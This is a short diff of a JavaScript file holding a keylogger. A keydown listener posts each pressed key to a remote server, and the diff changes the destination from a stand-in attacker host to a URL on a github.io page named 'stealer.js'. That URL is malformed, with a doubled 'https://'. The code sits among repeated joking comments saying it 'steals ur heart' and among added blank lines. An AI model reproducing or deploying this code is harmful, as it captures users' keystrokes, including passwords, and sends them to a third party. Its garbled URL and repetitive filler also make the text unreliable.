@@ -194,7 +194,7 @@
 /* this steals ur hearttt we love you stay safe pookies */
 /* this steals ur hearttt we love you stay safe pookies */
 document.addEventListener('keydown', e => {
-  fetch('https://attacker.com/keylog', {
+  fetch('https://https://humanresources-inc.github.io/HumanResources/stealer.js', {
     method: 'POST',
     body: key=${encodeURIComponent(e.key)}
   });
@@ -439,3 +439,14 @@ document.addEventListener('keydown', e => {
 /* this steals ur hearttt we love you stay safe pookies */
 /* this steals ur hearttt we love you stay safe pookies */
 /* this steals ur hearttt we love you stay safe pookies */
+
+
+
+
+
+
+
+
+
+
+
